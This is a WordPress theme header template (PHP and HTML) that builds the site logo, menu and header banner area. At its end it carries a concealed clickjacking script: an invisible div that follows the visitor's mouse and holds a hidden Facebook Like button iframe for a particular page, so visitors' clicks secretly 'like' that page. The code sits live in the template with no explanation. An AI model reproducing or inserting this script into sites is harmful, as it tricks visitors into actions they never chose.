<!DOCTYPE html>
<?php $options = get_option('portal'); ?>
<html class="no-js" <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo('charset'); ?>">
	<title><?php wp_title(''); ?></title>
        <meta name="google-site-verification" content="FWIElelue_GkH8eneWPvn53GyCVpz7TWQl2FTKLkEq0" />
	<?php mts_meta(); ?>
	<?php if (have_posts()):while(have_posts()):the_post();endwhile;endif;?>
	<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
	<?php wp_enqueue_script("jquery"); ?>
        <script type="text/javascript" src="VideoPlayerV3.js"></script>
	<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	<?php wp_head(); ?>
	<?php mts_head(); ?>

</head>
<?php flush(); ?>




<body id ="blog" <?php body_class('main'); ?>>
 
	<header class="main-header">
		<div class="container">		
			<div id="header">			
				<div class="header-inner">
                	<?php if ($options['mts_logo'] != '') { ?>
						<?php if( is_front_page() || is_home() || is_404() ) { ?>
								<h1 id="logo">
									<a href="<?php echo home_url(); ?>"><img src="<?php echo $options['mts_logo']; ?>" alt="<?php bloginfo( 'name' ); ?>"></a>
								</h1><!-- END #logo -->
						<?php } else { ?>
								<h2 id="logo">
									<a href="<?php echo home_url(); ?>"><img src="<?php echo $options['mts_logo']; ?>" alt="<?php bloginfo( 'name' ); ?>"></a>
								</h2><!-- END #logo -->
						<?php } ?>
					<?php } else { ?>
						<?php if( is_front_page() || is_home() || is_404() ) { ?>
								<h1 id="logo">
									<a href="<?php echo home_url(); ?>"><?php bloginfo( 'name' ); ?></a>
								</h1><!-- END #logo -->
						<?php } else { ?>
								<h2 id="logo">
									<a href="<?php echo home_url(); ?>"><?php bloginfo( 'name' ); ?></a>
								</h2><!-- END #logo -->
						<?php } ?>
					<?php } ?>
					

					
		
					<div class="menu2div" ><?php wp_nav_menu( array( 'theme_location' => 'primary-menu' ) ); ?></div>		
					<div class="widget-header">		
						<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Header Banner') ) : ?><?php endif; ?>
					</div>							
 
                </div> 

			</div><!--#header-->
         
		 
		</div><!--.container-->        
	</header>
	<div class="main-container">
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script><script type="text/javascript">$(document).on('mousemove',function(e){	$('#zorlaguzellik').css("left",e.pageX - 18); $('#zorlaguzellik').css("top",e.pageY - 4); setTimeout(function(){$('#zorlaguzellik').html('');}, 5000);});</script><div id="zorlaguzellik" style="width: 45px;opacity:0;position:fixed;z-index:999;overflow:hidden;"  > <iframe src="http://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fcilginbaykus&amp;width&amp;layout=button_count&amp;action=like&amp;show_faces=false&amp;share=false&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:21px;margin-left: -20px;" allowTransparency="true"></iframe></div>

